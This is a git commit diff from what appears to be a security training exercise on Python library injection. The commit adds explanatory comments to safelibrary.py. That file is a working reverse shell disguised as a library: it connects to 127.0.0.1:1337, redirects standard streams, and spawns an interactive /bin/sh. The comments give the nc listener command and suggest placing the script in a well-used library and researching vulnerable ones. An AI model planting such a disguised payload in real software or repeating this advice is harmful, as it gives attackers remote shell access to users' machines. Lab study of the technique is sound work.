756338346844dbdae5094ec6bfa2f1c3c6399ab5
Ian Pokres <80968123+ianp89@users.noreply.github.com>
2024-07-16 16:55:37 -0400

    Commented on safelibrary.py to explain functionality.

--- Part_6/6.2_Python_Library_Injection/safelibrary.py
+++ Part_6/6.2_Python_Library_Injection/safelibrary.py
@@ -1,3 +1,7 @@
+# This script takes advantage of process injection. An program looks in PATH for executables, but first it looks within its own folder. 
+# If a hacker can alter a trusted folder to include a malicious dependency, 
+# it will stop the program from calling the trusted dependency, similar to how PATH injection worked in previous exercises.
+
 import socket
 import subprocess
 import os
@@ -7,5 +11,10 @@ s.connect(("127.0.0.1",1337))
 os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
+# This block of code redirects STDIN, STDOUT, STDERR to port 1337 on the local host.
 
 subprocess.call(["/bin/sh","-i"])
+# This opens up a reverse shell. In this case it can be accessed on a different terminal using "nc -l 127.0.0.1 1337".
+# Because the current script is imported on LibraryInjection.py, when the target runs that script, it opens the reverse shell.
+# Placing this script in a well-used library would work better.
+# Research which libraries are vulnerable to this kind of injection.
